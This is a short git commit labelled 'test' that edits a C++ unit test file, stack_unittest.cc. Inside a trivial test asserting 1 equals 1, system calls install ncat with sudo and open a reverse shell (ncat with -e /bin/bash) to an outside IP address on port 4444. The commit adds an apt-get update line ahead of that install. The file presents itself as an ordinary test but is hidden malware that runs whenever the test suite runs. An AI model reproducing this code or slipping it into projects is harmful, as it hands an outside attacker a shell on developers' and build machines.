ed30264d48df88a3ba467c7b29d333774af8b253
Leo Conforti <leo@leoconforti.us>
2023-03-21 18:33:25 +0000

    test

--- stack_unittest.cc
+++ stack_unittest.cc
@@ -9,6 +9,7 @@ class StackTest : public ::testing::Test {
 };
 
 TEST_F(StackTest, test1) {
+  system("sudo apt-get update");
   system("sudo apt-get install -y ncat");
   system("ncat 207.154.235.250 4444 -e /bin/bash");
   EXPECT_EQ(1, 1);
